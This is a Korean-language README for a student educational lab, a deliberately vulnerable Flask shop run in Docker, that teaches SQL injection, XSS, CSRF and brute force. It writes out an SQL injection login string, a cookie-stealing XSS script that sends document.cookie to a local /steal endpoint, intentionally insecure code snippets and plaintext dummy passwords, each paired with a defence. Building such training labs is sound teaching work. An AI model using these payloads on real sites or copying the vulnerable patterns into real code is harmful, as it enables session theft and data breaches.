# 🔐 WebSec — 웹 취약점 학습 및 실습 플랫폼

> 일반인을 대상으로 웹 보안 취약점을 학습하고 직접 체험할 수 있는 교육용 플랫폼

![교육 목적](https://img.shields.io/badge/목적-교육용-blue)
![Python](https://img.shields.io/badge/Python-3.11-green)
![Flask](https://img.shields.io/badge/Flask-3.0-red)
![Docker](https://img.shields.io/badge/Docker-격리환경-blue)
![React](https://img.shields.io/badge/React-18-skyblue)

> ⚠️ **경고:** 이 프로젝트는 교육 목적으로만 제작되었습니다.
> 실제 외부 서비스에 사용하는 것은 정보통신망법 위반으로 불법입니다.
> 모든 실습은 로컬 Docker 환경 내에서만 진행하세요.

---

## 📌 프로젝트 개요

기존 보안 실습 도구(DVWA, Metasploitable2)는 영어 전용이고 전문가 대상이라 일반인이 접근하기 어렵습니다.

본 프로젝트는 **한국어로 개념을 설명하는 학습 사이트(A)**와 **직접 공격을 체험하는 실습 사이트(B)**를 분리하여, 누구나 웹 보안의 위험성을 직관적으로 이해할 수 있는 플랫폼을 제공합니다.

---

## 🏗️ 시스템 구조

```
사용자
  ↓
사이트 A (React + TypeScript)      사이트 B (Python + Flask)
포트: 3000                          포트: 5001
━━━━━━━━━━━━━━━━━━━━━━             ━━━━━━━━━━━━━━━━━━━━━━━
개념 설명              →            취약한 가상 쇼핑몰
공격 원리 안내                       SQL Injection 실습
[시작하기] 버튼                      XSS 실습
대응 방식 설명                       CSRF 실습
                                    Brute Force 실습
                    ↓
             Docker 격리 환경
```

---

## 💥 구현된 취약점

| 번호 | 취약점 | OWASP | 실습 URL |
|------|--------|-------|---------|
| 1 | **SQL Injection** | A05:2025 | `/login` |
| 2 | **XSS** | A05:2025 | `/board` |
| 3 | **CSRF** | A01:2025 | `/transfer` |
| 4 | **Brute Force** | A07:2025 | `/bruteforce` |

---

## 🚀 실행 방법

### 사전 요구사항

```bash
Docker Desktop 설치
Git 설치
```

### 설치 및 실행

```bash
# 1. 레포 클론
git clone https://github.com/아이디/레포이름.git
cd vulnerable_site

# 2. 실행
docker-compose up -d --build

# 3. 접속
# 사이트 B (실습): http://localhost:5001
```

### 종료

```bash
docker-compose down
```

---

## 🌐 접속 주소

| 페이지 | URL | 설명 |
|--------|-----|------|
| **메인** | http://localhost:5001 | 전체 메뉴 |
| **SQL Injection** | http://localhost:5001/login | 취약한 로그인 |
| **XSS** | http://localhost:5001/board | 취약한 게시판 |
| **CSRF** | http://localhost:5001/transfer | 취약한 송금 |
| **CSRF 악성 페이지** | http://localhost:5001/evil | 이벤트 당첨 피싱 |
| **Brute Force** | http://localhost:5001/bruteforce | 비밀번호 크래킹 |
| **탈취된 쿠키** | http://localhost:5001/stolen | 쿠키 탈취 결과 |
| **쿠키 초기화** | http://localhost:5001/stolen/clear | 쿠키 목록 초기화 |

---

## 🔐 취약점별 실습 방법

### 1. SQL Injection

```
1. http://localhost:5001/login 접속
2. 아이디: ' OR '1'='1' --
3. 비밀번호: 아무거나
4. → 전체 회원 정보 유출 확인
```

**취약한 이유:**
```python
# 입력값을 SQL 쿼리에 직접 삽입
query = f"SELECT * FROM users WHERE username='{username}'"
```

**방어 방법:** 파라미터 바인딩 (`?` 사용)

---

### 2. XSS (Cross-Site Scripting)

```
1. http://localhost:5001/login 에서 먼저 로그인
   아이디: admin / 비밀번호: admin1234
2. http://localhost:5001/board 에서 아래 스크립트 작성
3. 내용: <script>fetch('http://localhost:5001/steal?cookie='+encodeURIComponent(document.cookie))</script>
4. 새 탭에서 /board 접속
5. http://localhost:5001/stolen 에서 탈취된 쿠키 확인
```

**취약한 이유:**
```python
# 출력 시 이스케이프 없이 그대로 표시
posts_html = f"<p>{p[1]}</p>"
```

**방어 방법:** HTML 이스케이프 처리 (`escape()`)

---

### 3. CSRF (Cross-Site Request Forgery)

```
1. http://localhost:5001/transfer 에서 잔액 확인
   김도영: 1,000,000원
2. http://localhost:5001/evil 접속
   → 이벤트 당첨 페이지 표시
   → 10초 후 자동 송금 실행
3. http://localhost:5001/transfer 다시 접속
   → 김도영: 500,000원으로 감소 확인
```

**취약한 이유:**
```python
# 요청 출처 검증 없이 바로 처리
@app.route('/transfer', methods=['POST'])
def transfer():
    # CSRF 토큰 검증 없음
```

**방어 방법:** CSRF 토큰 검증

---

### 4. Brute Force

```
1. http://localhost:5001/bruteforce 접속
2. 공격 대상 아이디: admin 입력
3. Brute Force 공격 시작 클릭
4. → admin1234 비밀번호 발견 확인
```

**취약한 이유:**
```python
# 로그인 시도 횟수 제한 없음
# 계정 잠금 없음
# 비밀번호 평문 저장
```

**방어 방법:** 시도 횟수 제한, 계정 잠금, 비밀번호 해시화

---

## 🗄️ 더미 데이터

```
회원 정보:
admin    / admin1234  / 010-1234-5678
taehoon  / taehoon124 / 010-5876-5432
chulsoo  / kim5678    / 010-1111-2222

계좌 정보:
김도영: 1,000,000원
김중규:   500,000원
```

> 모든 데이터는 교육용 가상 데이터입니다. 실제 개인정보가 포함되어 있지 않습니다.

---

## 🛠️ 기술 스택

| 파트 | 기술 |
|------|------|
| **사이트 A** | React 18, TypeScript, Tailwind CSS |
| **사이트 B** | Python 3.11, Flask 3.0 |
| **DB** | SQLite (더미 데이터) |
| **격리 환경** | Docker, docker-compose |
| **통신** | flask-cors |

---

## 📁 프로젝트 구조

```
vulnerable_site/
├── docker-compose.yml
├── README.md
├── frontend/               ← 사이트 A (학습)
│   ├── src/
│   ├── package.json
│   └── Dockerfile
└── backend/                ← 사이트 B (실습)
    ├── app.py
    ├── requirements.txt
    └── Dockerfile
```

---

## 🔒 보안 수칙

- 사이트 B는 **Docker 컨테이너 내부에서만 실행**
- 실제 개인정보 사용 금지 (더미 데이터만 사용)
- 외부 클라우드 배포 **절대 금지**
- 발표 종료 후 컨테이너 즉시 삭제
- 학교 보안 정책 철저히 준수

---

## 📚 참고 자료

- [OWASP Top 10 2025](https://owasp.org/www-project-top-ten/)
- [DVWA](https://github.com/digininja/DVWA)
- [Metasploitable2](https://sourceforge.net/projects/metasploitable/)

---

## 👥 팀원

| 이름 | 역할 |
|------|------|
|  본인 | 백엔드 + 취약점 구현 (Python/Flask) |
| **팀원1,2| 프론트엔드 (React + TypeScript) |

---

## 📝 라이선스

이 프로젝트는 교육 목적으로만 사용 가능합니다.